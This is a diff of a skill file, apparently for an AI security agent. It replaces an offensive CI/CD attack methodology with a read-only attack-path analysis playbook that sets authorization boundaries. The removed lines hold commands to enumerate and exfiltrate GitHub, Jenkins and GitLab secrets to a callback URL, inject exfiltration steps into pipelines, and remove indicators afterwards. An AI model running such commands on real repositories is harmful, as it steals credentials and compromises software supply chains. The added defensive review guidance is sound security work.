@@ -1,81 +1,50 @@
 ---
 name: cicd-attacks
-description: CI/CD pipeline attacks for secret extraction, pipeline injection, and supply chain compromise via GitHub/Jenkins/GitLab
+description: "Analyze authorized CI/CD attack paths across workflow triggers, runners, credentials, artifacts, and deployment boundaries"
 category: post-exploitation
-tags: [cicd, github-actions, jenkins, gitlab, pipeline, supply-chain, secret-extraction, credential-access]
-tech_stack: [github, jenkins, gitlab, python, requests]
-cwe_ids: [CWE-522, CWE-693, CWE-829, CWE-284]
-chains_with: [T1195.002, T1552.004, T1059, T1098]
-prerequisites: [T1078]
-version: "1.0"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [cicd, github-actions, jenkins, gitlab, supply-chain, trust-boundary]
+tech_stack: [github-actions, gitlab-ci, jenkins, containers, cloud]
+prerequisites:
+  - "Written authorization for the repository and any test runner/environment"
+  - "A non-production test plan; read-only review is the default"
+chains_with: [ci-assessment, cloud-assessment, attack-triage-validation]
+sources:
+  - "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-cicd/SKILL.md"
+  - "https://github.com/uphiago/recon-skills"
 ---
 
-# CI/CD Pipeline Attack Methodology
+# CI/CD Attack-Path Analysis
 
-CI/CD pipeline attacks target the software delivery infrastructure to extract secrets, inject malicious code, and establish persistence. After gaining access to GitHub, Jenkins, or GitLab, these tools extract stored credentials, inject pipeline steps for secret exfiltration, and manipulate workflow configurations.
+## Purpose
 
-## Prerequisites
+Identify how untrusted source, dependencies, workflow inputs, runners, credentials, and artifacts could cross into a privileged build or deployment context. This is an analysis playbook, not permission to execute a pipeline exploit.
 
-1. **CI/CD access** — API token, personal access token, or service account credentials
-2. **Python packages** — `pip3 install requests`
-3. **API access** — Valid token with appropriate scopes (repo, admin, workflow)
+## Safety and boundaries
 
-```bash
-# Quick prerequisite check — GitHub
-curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/user | jq .login
+Never exfiltrate secrets, deploy a payload, modify production pipelines, or trigger untrusted code in a privileged environment without explicit written approval. Do not confuse a theoretical path with demonstrated impact. Use read-only repository and configuration evidence by default.
 
-# Quick prerequisite check — Jenkins
-curl -s -u "$JENKINS_USER:$JENKINS_TOKEN" "$JENKINS_URL/api/json" | jq .nodeDescription
+## Procedure
 
-# Quick prerequisite check — GitLab
-curl -s -H "Private-Token: $GITLAB_TOKEN" "$GITLAB_URL/api/v4/user" | jq .username
-```
+1. **Map trust zones.** Separate contributor-controlled code, trusted branches, CI orchestration, build runners, artifact registries, release signing, and production deployment.
+2. **Trace triggers.** Identify which events can execute code and whether fork pull requests, comments, issue titles, tags, or workflow inputs influence privileged jobs.
+3. **Trace permissions.** Follow tokens, environment secrets, cloud federation, deploy keys, package registry credentials, and runner identity. Record the minimum privileges available at each step without revealing secret values.
+4. **Inspect injection surfaces.** Review workflow expressions, shell interpolation, artifact names/paths, cache keys, build scripts, and generated configuration for untrusted data reaching executable or privileged contexts.
+5. **Inspect persistence and isolation.** Check workspace reuse, runner cleanup, shared caches, container boundaries, artifact overwrite, and whether an untrusted job can influence a later trusted job.
+6. **Review dependency compromise paths.** Identify unpinned actions, mutable tags, package lifecycle scripts, dependency confusion risk, unsigned artifacts, and missing provenance. Validate reachability and execution context before claiming exploitability.
+7. **Model the attack graph.** For every edge, record the source evidence, required permissions, attacker capability, and protective controls. Highlight the shortest credible path to a sensitive deployment or credential boundary.
+8. **Validate in a dedicated environment.** If approved, use a test repository, synthetic secrets, and non-production artifacts. Never use real secret values as a canary.
+9. **Recommend containment.** Separate untrusted and trusted jobs, restrict tokens, use ephemeral isolated runners, pin dependencies, protect release environments, sign/attest artifacts, and require trusted approvals.
 
-## Kill Chain Phases
+## Common false positives
 
-### Phase 1 — Reconnaissance
+- A secret is defined but unavailable to the triggering event.
+- A shell expression looks unsafe but is quoted or constrained.
+- A runner has network access but no sensitive identity or reusable state.
+- A dependency is unpinned but cannot affect a privileged release path.
+- A theoretical chain ignores branch protection or environment approval.
 
-| Action | Command | Purpose |
-|--------|---------|---------|
-| List GitHub secrets | `cipipe gh_secrets --repo OWNER/REPO --method list` | Enumerate repository and environment secret names |
-| Jenkins credentials | `cipipe jenkins_creds --url URL --method api` | List credential store entries |
-| GitLab variables | `cipipe gitlab_tokens --url URL --project-id ID` | Enumerate CI/CD variables and tokens |
+## Output contract
 
-### Phase 2 — Secret Extraction
-
-| Action | Command | Purpose |
-|--------|---------|---------|
-| GitHub dispatch | `cipipe gh_secrets --repo OWNER/REPO --method dispatch --callback-url URL` | Exfiltrate secrets via workflow dispatch |
-| Jenkins console | `cipipe jenkins_creds --url URL --method console` | Extract credentials via Groovy Script Console |
-| GitHub logs | `cipipe gh_secrets --repo OWNER/REPO --method logs` | Search workflow logs for leaked secrets |
-
-### Phase 3 — Pipeline Injection
-
-| Action | Command | Purpose |
-|--------|---------|---------|
-| Inject pipeline | `cipipe pipeline_inject --repo OWNER/REPO --callback-url URL` | Add exfiltration step to CI/CD pipeline |
-
-### Phase 4 — Cleanup (MANDATORY)
-
-```
-cipipe cleanup_ci
-```
-
-## Detection Considerations
-
-- **GitHub Audit Log** — Workflow creation, secret access, branch creation
-- **Jenkins Audit Trail Plugin** — Script console access, credential reads
-- **GitLab Audit Events** — Variable access, runner token reads, pipeline modifications
-- **Branch Protection Rules** — Prevent direct push to main/protected branches
-- **Required Reviews** — PR approval requirements block unauthorized workflow changes
-- **Secret Scanning** — GitHub/GitLab native scanning for leaked credentials
-
-## Program Reference
-
-| Program | Technique | MITRE ATT&CK |
-|---------|-----------|---------------|
-| gh_secrets | GitHub Actions secret extraction | T1552.004 — Private Keys |
-| jenkins_creds | Jenkins credential dump | T1555 — Credentials from Password Stores |
-| pipeline_inject | CI/CD pipeline injection | T1195.002 — Compromise Software Supply Chain |
-| gitlab_tokens | GitLab CI/CD variable extraction | T1552.004 — Private Keys |
-| cleanup_ci | Pipeline modification rollback | T1070 — Indicator Removal |
+Return the attack graph, trigger and trust boundary, source evidence, required preconditions, reachable capability, whether validation was static or active, confidence, and remediation. State clearly when a path remains hypothetical.
